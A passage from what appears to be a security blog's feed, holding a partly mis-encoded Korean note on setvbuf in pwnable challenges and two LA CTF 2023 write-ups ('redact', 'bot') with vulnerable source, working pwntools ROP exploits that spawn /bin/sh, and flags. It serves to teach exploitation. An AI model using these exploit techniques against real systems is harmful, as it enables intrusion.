ë²„í¼ë¼ëŠ” ê³µê°„ì„ ì“°ì§€ ì•ŠëŠ” ê±¸ë¡œ í•´ì„ëœë‹¤. </p><p>ì¸ìžë¥¼ ì‚´íŽ´ë³´ìž.</p><ul><li><code>File* stream</code><ul><li>ìž‘ì—…ì„ ìˆ˜í–‰í•  ì—´ë¦° ìŠ¤íŠ¸ë¦¼ì˜ <code>FILE</code> ê°ì²´ë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„°</li><li>í¬ë„ˆë¸” ë¬¸ì œë¥¼ í’€ì–´ë³¸ ê²½í—˜ì´ ìžˆë‹¤ë©´ <code>main</code> ì´ˆë°˜ì— <code>stdin</code>, <code>stdout</code>, <code>stderr</code> ë“±ì„ ë³¸ ê²½í—˜ì´ ìžˆì„ ê²ƒì´ë‹¤.</li></ul></li><li><code>char* buffer</code><ul><li>ìœ ì €ê°€ í• ë‹¹í•œ ë²„í¼ì¸ë° í¬ë„ˆë¸” ë¬¸ì œë¥¼ í’€ì–´ë³¸ ê²½í—˜ì´ ìžˆë‹¤ë©´ ë³´í†µ <code>NULL</code>ë¡œ ì„¤ì •ë˜ì–´ ìžˆë‹¤.</li><li><code>NULL</code>ì´ë¼ë©´ í•¨ìˆ˜ëŠ” ìžë™ìœ¼ë¡œ ì§€ì •í•œ í¬ê¸°ì˜ ë²„í¼ë¥¼ í• ë‹¹í•˜ê²Œ ëœë‹¤.</li></ul></li><li><code>int mode</code><ul><li>íŒŒì¼ ë²„í¼ë§ì˜ í˜•ì‹ì„ ì§€ì •í•˜ëŠ”ë° 3ê°€ì§€ê°€ ìžˆë‹¤.</li><li><code>_IOFBF</code>: ë²„í¼ê°€ ë‹¤ ì°¨ì§€ ì•ŠëŠ” ì´ìƒ ì“°ê¸° ìž‘ì—…ì„ í•˜ì§€ ì•ŠëŠ”ë‹¤. ì¦‰ ë²„í¼ì— <code>size</code> ë°”ì´íŠ¸ ì´ìƒ ì“°ì´ì§€ ì•ŠëŠ” ì´ìƒ <code>stream</code>ì— ì“°ì´ì§€ ì•ŠëŠ”ë‹¤.</li><li><code>_IOLBF</code>: ì¶œë ¥í•  ë•Œ ë²„í¼ê°€ ë‹¤ ì±„ì›Œì§€ê±°ë‚˜ ê°œí–‰ ë¬¸ìžê°€ ìž…ë ¥ ë˜ì—ˆìœ¼ë©´ ë°ì´í„°ê°€ ë²„í¼ì—ì„œ ì¶œë ¥ë˜ê³ , ìž…ë ¥ ì‹œì—ëŠ” ê°œí–‰ë¬¸ìžê¹Œì§€ ìž…ë ¥ë°›ëŠ”ë‹¤.</li><li><code>_IOLBF</code>: í¬ë„ˆë¸” ë¬¸ì œë¥¼ í’€ì–´ë³¸ ê²½í—˜ì´ ìžˆë‹¤ë©´ ë³´í†µì€ ì´ ê²½ìš°ë‹¤. ë²„í¼ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê² ë‹¤ëŠ” ëœ»ì´ë‹¤. <code>stdout</code>ì™€ <code>stderr</code>ëŠ” ë³´í†µ ì´ ëª¨ë“œë¡œ ì„¤ì •í•œë‹¤.</li></ul></li><li><code>size_t size</code><ul><li>ì§€ì •í•  ë²„í¼ì˜ í¬ê¸°ì˜ ë‹¨ìœ„</li><li><code>NULL</code>ì´ë¼ë©´ ì»´í“¨í„°ê°€ ì•Œì•„ì„œ ìµœì†Œì˜ í¬ê¸°ë¥¼ ì§€ì •í•œë‹¤.</li></ul></li></ul><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>); <span class="comment">// ìžˆëŠ” ê²ƒê³¼ ì—†ëŠ” ê²ƒì˜ ì°¨ì´?</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì˜ˆì‹œ ì½”ë“œì´ë‹¤. ìž…ë ¥ìœ¼ë¡œëŠ” ì•„ëž˜ë¥¼ ë³´ëƒˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p>ë‚´ ì˜ˆìƒìœ¼ë¡œëŠ” 1ë§Œ <code>n</code>ì— ë“¤ì–´ê°€ê³  (<code>setvbuf</code>ê°€ ìžˆë˜ ë§ë˜ ã…Ž;) ë‚˜ë¨¸ì§€ëŠ” ìž…ë ¥ì´ ë‹¤ ì”¹íž ê²ƒì´ë¼ê³  ìƒê°í–ˆë‹¤. </p><ul><li><code>setvbuf(stdin, 0, 2, 0)</code>ê°€ ì—†ëŠ” ê²½ìš°</li></ul><img src="/images/230223-pwn-setvbuf/Screenshot 2023-02-23 at 17.41.21.png" width=400/><br><p>ì¼ë‹¨ stackì„ ì‚´íŽ´ë³´ë©´ ì§€ì—­ë³€ìˆ˜ <code>n</code> ìžë¦¬ì— 1ë§Œ ì •ìƒì ìœ¼ë¡œ ë“¤ì–´ê°„ ëª¨ìŠµì„ í™•ì¸í•  ìˆ˜ ìžˆë‹¤. í•˜ì§€ë§Œ heap ìƒí™©ì€ ì–´ë–¨ê¹Œ?</p><img src="/images/230223-pwn-setvbuf/Screenshot 2023-02-23 at 17.40.39.png" width=600/><br><p><code>scanf</code> ë¡œì§ì— ì˜í•´ mallocì„ í•˜ê³  ë²„í¼ë§ì„ í•œë‹¤. heapì—ë‹¤ê°€ 1ì„ í¬í•¨í•œ ê°’ë“¤ì„ ì”¹ì§€ ì•Šê³  ì €ìž¥í•œ ëª¨ìŠµì„ ë³¼ ìˆ˜ ìžˆë‹¤. í›„ì— ì´ ê°’ì€ ë‚˜ì¤‘ì— <code>scanf</code>ë¡œ ê°’ì„ ë‹¤ì‹œ ìž…ë ¥ë°›ì„ ë•Œ ì‚¬ìš©ìžì—ê²Œ ìž…ë ¥ë°›ì§€ ì•Šê³  ì´ ê³µê°„ì—ì„œ êº¼ë‚´ì„œ ì”€ìœ¼ë¡œì¨ ì†ë„ ë“±ì˜ ì¸¡ë©´ì—ì„œ ì„±ëŠ¥ì„ í•­ìƒì‹œí‚¨ë‹¤ê³  í•œë‹¤.</p><p>í¬ë„ˆë¸” ë¬¸ì œì—ì„œ í•´ë‹¹ êµ¬ë¬¸ì´ ìžˆëŠ” ê²ƒì€ ì´ ë•Œë¬¸ì¸ë°, ì´ê²ƒì´ ì—†ìœ¼ë©´ ìž…ë ¥ê³¼ ì¶œë ¥ ê°„ì˜ ìˆœì„œê°€ ëª¨í˜¸í•´ì§€ê³  leakí•œ ê°’ì„ ì¶œë ¥ì„ í•´ì•¼í•˜ëŠ”ë° ì¶œë ¥ì´ ì•ˆë  ìˆ˜ë„ ìžˆë‹¤. ê·¸ëž˜ì„œ <code>setvbuf</code> í•¨ìˆ˜ë¡œ ë²„í¼ë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ”, ì¦‰ ë²„í¼ë§ì„ í•˜ì§€ ì•Šì•„ì•¼ í•œë‹¤. </p><ul><li><code>setvbuf(stdin, 0, 2, 0)</code>ê°€ ìžˆëŠ” ê²½ìš°</li></ul><img src="/images/230223-pwn-setvbuf/Screenshot 2023-02-23 at 18.37.28.png" width=700/><br><p>ë””ë²„ê¹…ìœ¼ë¡œ í™•ì¸í–ˆëŠ”ë° ë‹¨í˜¸í•˜ê²Œ 1 ë’¤ì— ê°’ì€ ë‹¤ ì”¹ëŠ”ë‹¤. </p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>í¬ë„ˆë¸” ë¬¸ì œì—ì„œ ì¼ë°˜ì ìœ¼ë¡œ <code>setvbuf(stdin, 0, 2, 0)</code>ì™€ ê°™ì€ êµ¬ë¬¸ì´ ìžˆì–´ì•¼í•œë‹¤. í•˜ì§€ë§Œ ì—†ëŠ” ê²½ìš°ë„ ìžˆë‹¤. ì € êµ¬ë¬¸ì´ ì—†ê³  <code>scanf</code>ì™€ ê°™ì€ í•¨ìˆ˜(mallocì„ ì‹œë„í•˜ëŠ” í•¨ìˆ˜)ë¡œ ì‚¬ìš©ìžì— ìž…ë ¥ì„ ë°›ëŠ”ë‹¤ë©´? heapì— payloadë¥¼ ì €ìž¥í•´ì„œ ROPë¥¼ ì‹œë„í•˜ëŠ” ë°©í–¥ìœ¼ë¡œ ì§„í–‰í•´ë´ë„ ì¢‹ì„ ë“¯í•˜ë‹¤.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> setvbuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - redact (CPP, std::string)</title>
      <link href="/230216-lactf2023-redact/"/>
      <url>/230216-lactf2023-redact/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>I heard C was insecure so I wrote my flag redactor program in C++.<br><code>nc lac.tf 31281</code></p></blockquote><ul><li>[46 solves &#x2F; 476 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Enter some text: &quot;</span>;</span><br><span class="line">  std::string text;</span><br><span class="line">  <span class="keyword">if</span> (!std::<span class="built_in">getline</span>(std::cin, text)) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read text\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Enter a placeholder: &quot;</span>;</span><br><span class="line">  std::string placeholder;</span><br><span class="line">  <span class="keyword">if</span> (!std::<span class="built_in">getline</span>(std::cin, placeholder)) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read placeholder\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Enter the index of the stuff to redact: &quot;</span>;</span><br><span class="line">  <span class="type">int</span> index;</span><br><span class="line">  <span class="keyword">if</span> (!(std::cin &gt;&gt; index)) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read index\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; text.<span class="built_in">size</span>() - placeholder.<span class="built_in">size</span>()) &#123; <span class="comment">// [*]</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Invalid index\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::<span class="built_in">copy</span>(placeholder.<span class="built_in">begin</span>(), placeholder.<span class="built_in">end</span>(), text.<span class="built_in">begin</span>() + index); <span class="comment">// [**]</span></span><br><span class="line">  std::cout &lt;&lt; text &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Look at the <code>[*]</code>. The <code>text.size()</code> and <code>placeholder.size()</code> are <code>size_t</code>. It means <code>unsigned</code>. But <code>index</code> is just <code>int</code>.<br>If <code>text.size()</code> is 0 and <code>placeholder.size()</code> is 8, the result of <code>text.size() - placeholder.size()</code> is normally -8(When it is <code>signed</code>..). But it is not. Becuase of their type is <code>unsigned</code>, the result of that is very big int. </p><p>If <code>text</code> is stored in stack, it can cause the BOF at <code>[**]</code>. We can trigger this, but We need to know the how <code>std::string</code> is stored in memory.</p><p>Here is the structure of that <code>std::string</code> is stored in memory.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+00h: &lt;Data Pointer&gt; </span><br><span class="line">+08h: &lt;Data Size&gt;</span><br><span class="line">+10h: &lt;Data&gt;  </span><br><span class="line">+18h: &lt;Data&gt;</span><br></pre></td></tr></table></figure><p>When <code>Data Size</code> is over <code>0x10</code>, <code>Data Pointer</code> is placed in heap. This mean that normally is placed in stack. You can use this feacture for exploit.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>leak libc</li><li>use the one gadget</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./redact2&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31281</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./redact2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># === first main ===</span></span><br><span class="line"></span><br><span class="line">rop1 = ROP(e, badchars=<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop1.call(<span class="string">&quot;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc&quot;</span>, [e.symbols[<span class="string">&quot;_ZSt4cout&quot;</span>], e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]])</span><br><span class="line">rop1.raw(rop1.find_gadget([<span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">rop1.main()</span><br><span class="line"></span><br><span class="line">info(rop1.dump())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;text: &quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;placeholder: &quot;</span>, rop1.generatePadding(<span class="number">0</span>, <span class="number">72</span>) + rop1.chain())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;redact: &quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># === second main ===</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xc961a execve(&quot;/bin/sh&quot;, r12, r13)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="comment">#   [r13] == NULL || r13 == NULL</span></span><br><span class="line">rop2 = ROP(e, badchars=<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop2(r12=<span class="number">0</span>, r13=<span class="number">0</span>)</span><br><span class="line">rop2.raw(libc.address + <span class="number">0xc961a</span>) <span class="comment"># one gadget </span></span><br><span class="line"></span><br><span class="line">info(rop2.dump())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;placeholder: &quot;</span>, rop2.generatePadding(<span class="number">0</span>, <span class="number">72</span>) + rop2.chain())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;redact: &quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>I use the <code>ROP</code> function first time that pwntools have. It is comfortable than I thought.</p><p>If you want to understand leak process, you need to understand <code>C++ style print</code>.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/images/230216-lactf2023-redact/Screenshot 2023-02-15 at 21.44.35.png" width=700/><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;1_l0v3_c++_L2zuBdqJABGU&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/uclaacm/lactf-archive/blob/master/2023/pwn/redact/solve.py">https://github.com/uclaacm/lactf-archive/blob/master/2023/pwn/redact/solve.py</a></li><li><a href="https://docs.pwntools.com/en/stable/rop/rop.html">https://docs.pwntools.com/en/stable/rop/rop.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> integer underflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - bot</title>
      <link href="/230215-lactf2023-bot/"/>
      <url>/230215-lactf2023-bot/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>I made a bot to automatically answer all of your questions.<br><code>nc lac.tf 31180</code></p></blockquote><ul><li>[197 solves &#x2F; 363 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="type">char</span> input[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> give_flag = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hi, how can i help?&quot;</span>);</span><br><span class="line">  gets(input);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;give me the flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;lol no&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;please give me the flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;help, i have no idea how to solve this&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;L&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;may i have the flag?&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;not with that attitude&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;please please please give me the flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;i&#x27;ll consider it&quot;</span>);</span><br><span class="line">    sleep(<span class="number">15</span>);</span><br><span class="line">    <span class="keyword">if</span> (give_flag) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;ok here&#x27;s your flag&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;sorry, i didn&#x27;t understand your question&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>give_flag</code> ë³€ìˆ˜ ê°’ì„ ìž…ë ¥ ê°’ì„ í†µí•´ì„œ ë°”ê¿”ì¤„ ìˆ˜ê°€ ì—†ë‹¤. ë‹¤í–‰ížˆ <code>system</code> í•¨ìˆ˜ ì£¼ì†Œê°€ ì¡´ìž¬í•˜ë‹ˆ bss ì˜ì—­ì— â€˜&#x2F;bin&#x2F;sh\x00â€™ì„ ì“°ê³  <code>system</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¤ë©´ ëœë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./bot&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31180</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./bot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x40133b</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;may i have the flag?\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">64</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x404068</span>)</span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x404068</span>)</span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;hey_stop_bullying_my_bot_thats_not_nice&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - rickroll (FSB)</title>
      <link href="/230215-lactf2023-rickroll/"/>
      <url>/230215-lactf2023-rickroll/</url>
      
